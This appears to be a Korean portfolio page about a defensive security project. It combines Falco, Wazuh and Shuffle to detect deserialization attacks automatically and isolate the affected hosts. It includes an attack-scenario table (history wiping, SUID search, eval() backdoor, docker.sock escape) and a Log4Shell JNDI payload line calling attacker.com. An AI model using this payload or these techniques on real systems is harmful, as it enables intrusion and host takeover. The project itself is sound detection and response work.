---
layout: project
title: "MITRE ATT&CK 기반 지능형 침해사고 분석 및 자동 대응 시스템 구축"
summary: "제로데이 역직렬화 공격에 대해 Falco(커널 시스템 콜 감시) + Wazuh(SIEM) + Shuffle(SOAR)를 결합하여, 탐지부터 격리까지 자동 대응을 실현한 차세대 보안 운영 아키텍처를 설계하고 구현했습니다."
image: assets/images/google-cloud-backup.png
technologies: [Wazuh, Falco, Shuffle, OPNsense, MISP, AbuseIPDB, Docker, Python]
github:
categories: security
---

## 개요

기존 시그니처 기반 보안 솔루션이 역직렬화 제로데이 페이로드를 탐지하지 못하는 한계를 극복하기 위해, **"침해 가정(Assume Breach)"** 전략을 채택했습니다. 커널 레벨 시스템 콜 감시(Falco), 통합 로그 분석(Wazuh), 상태 유지형 자동화 대응(Shuffle)을 결합하여, 공격의 **탐지부터 네트워크 격리까지 10초 이내에 완료**하는 SOAR(Security Orchestration, Automation, and Response) 파이프라인을 구축했습니다.

***

## 주요 성과

- **MTTR 단축:** 수동 대응 시 15~30분 소요되던 시간을 **10초 이내(98%+)**로 단축
- **탐지율(TDR):** 역직렬화 기반 Remote Shell 100%, 랜섬웨어(FIM) 85%, 권한 상승 90% 달성
- **대응 성공률:** 격리 및 차단 자동화 성공률 100% (권한 상승은 80%)

***

## 핵심 아키텍처 및 파이프라인

![시스템 아키텍처](/assets/images/Network%20Architecture.jpg)

1. **수집 (Falco + Wazuh):** 커널 시스템 콜 감시 및 분산 로그 수집
2. **정규화 (Wazuh):** 이기종 로그 표준화 및 Agent ID 기반 자산 매칭
3. **다차원 분석 (Shuffle):** AbuseIPDB(IP 평판), MISP(해시 대조), SCA(취약도) 동시 분석
4. **상관 분석 및 스코어링:** 행위별 가중치(랜섬웨어 +20, RCE +15 등) 기반 누적 위험도 정량화
5. **단계적 자동 대응:** 임계치에 따른 차단(OPNsense), 격리, 알림 수행

***

## 7단계 공격 시나리오 (React2Shell)

다중 언어(Java, PHP, Node.js) 역직렬화 취약점을 선행 연구하여 도출한 **"공격 성공 후 시스템 콜 행위는 수렴한다"**는 가설을 바탕으로 단일화된 공격 시나리오를 검증했습니다.

| 단계 | 공격 행위 | MITRE ATT&CK | 탐지 등급 |
|------|----------|-------------|----------|
| 1. 초기 침투 | React2Shell 페이로드 → 리버스 쉘 | TA0001 (T1190) | **CRITICAL** |
| 2. 정찰 | `env`, `whoami`, `ifconfig` 실행 | TA0007 (T1082) | WARNING |
| 3. 방어 회피 | 히스토리 삭제 (`HISTFILE=/dev/null`) | TA0005 (T1070.003) | **CRITICAL** |
| 4. 권한 상승 | SUID 바이너리 탐색 | TA0004 (T1548.001) | **CRITICAL** |
| 5. 랜섬웨어 | Python 메모리 내 실행 + 암호화 | TA0040 (T1486) | **CRITICAL** |
| 6. 지속성 | API Route에 `eval()` 백도어 삽입 | TA0003 (T1505.003) | DETECT |
| 7. 탈출 | `docker.sock` 악용 → 호스트 루트 탈취 | TA0004 (T1611) | **CRITICAL** |

### 시연 영상

<video width="100%" height="auto" controls>
  <source src="/assets/videos/Interrupt_attack.mp4" type="video/mp4">
</video>

***

## 담당 업무 및 기여도

### 1. Java 역직렬화(Log4Shell) 공격 연구 및 범용 룰 도출

- **취약점 재현:** Log4j2 JNDI Lookup을 악용한 `${jndi:ldap://attacker.com/exploit}` 페이로드로 Docker 환경에서 RCE 성공 과정을 구현했습니다.
- **행위 수렴 가설 실증:** RCE 직후 PID 1(Java)의 자식으로 `/bin/sh`가 생성되는 비정상 계보를 포착했습니다. 이를 PHP와 Node.js에서도 동일하게 확인하여, 언어 종속성을 탈피한 시스템 콜 기반 공통 탐지 정책의 핵심 근거를 마련했습니다.

### 2. Wazuh SIEM 대시보드 및 탐지 엔진 고도화
![local rule](/assets/images/rules.png)
- **falco 룰 파싱 및 TID부여**: falco에서 받은 로그를 agent로 받아 중앙에서 파싱하여 TID와 rule.level을 부여했습니다.
- **CDB & FIM 연동:** CDB 리스트로 실시간 악성 IoC 대조 환경을 구성하고, FIM을 통해 10분 내 대량 파일 변경 시 랜섬웨어로 탐지하는 상관 분석 룰을 작성했습니다.
- **가시성 확보:** 탐지 이벤트에 MITRE ATT&CK Tactic/Technique ID를 자동 매핑하는 대시보드를 구축했습니다.

### 3. MISP 위협 인텔리전스(TI) 기반 교차 검증 파이프라인

- MISP 플랫폼을 Shuffle 워크플로우에 연동하여, FIM이 감지한 파일 해시값을 MISP API로 자동 대조했습니다.
- 외부 데이터(AbuseIPDB, MISP)의 오탐 리스크를 고려하여, TI 검증 결과는 스코어링 엔진에 보조 가중치(×0.1)로만 반영하는 안전한 교차 검증 로직을 구현했습니다.

### 4. 선제적 포렌식 증거 보존 스크립트(Active Response) 개발

- **문제 인식:** 네트워크 격리 후 원격 IP 및 세션 등 휘발성 데이터가 소멸되어 사후 분석이 제한되는 문제를 파악했습니다.
- **해결:** Critical 등급 시 네트워크 차단 직전 netstat, 프로세스 트리, 환경 변수 등 휘발성 데이터를 로컬 스냅샷으로 저장하는 shell script 기반 Active Response 스크립트를 개발했습니다.

### 5. 문서화 및 프로젝트 총괄 리드

- 4주 차 방향성 전환(3개 언어 개별 시나리오 → React2Shell 통합)을 주도하고 주간 진척률을 관리했습니다.
- 주간 일지 작성 및 착수 보고서, 중간 개발 보고서를 작성했습니다.
- 기술적 깊이와 비즈니스 지표(MTTR 감소율, 노이즈 제거율)를 포괄한 최종 프로젝트 보고서를 작성했습니다.

***

## 기술 트러블슈팅

| 영역 | 문제 상황 | 해결 방법 |
|------|-----------|-----------|
| **가시성 확보** | Ubuntu에서 Sysmon 호환성 문제로 프로세스 모니터링 불가 | 커널 모듈 기반 **Falco로 전환**하여 Linux 시스템 콜 레벨 모니터링 확보 |
| **탐지 최적화** | Falco 기본 룰에서 정상 컨테이너 빌드 작업 시 대량 경고(Noise) 발생 | `proc.pcmdline`에 `-i`(대화형) 옵션 검사 로직을 추가 및 화이트리스트 튜닝으로 노이즈 제거 |
| **자동화 파이프라인** | TheHive+Cortex의 워크플로우 유연성 부족 | 유연한 API 연동과 스코어링 구현이 가능한 **Shuffle SOAR로 교체** |
| **비용 절감** | 언어별(Java, PHP, JS) 시나리오 유지 보수 비용 증가 | 역직렬화 공격의 행위 수렴 가설을 바탕으로 **단일 시나리오(React2Shell)로 탐지 정책 통합** |
| **스코어링 로직** | Shuffle의 Agent 캐시 초기화 타이밍 오류로 누적 점수 합산 실패 | 세션 관리 고도화 및 캐시 초기화 트리거 수정으로 **상태 유지(Stateful) 엔진 안정화** |
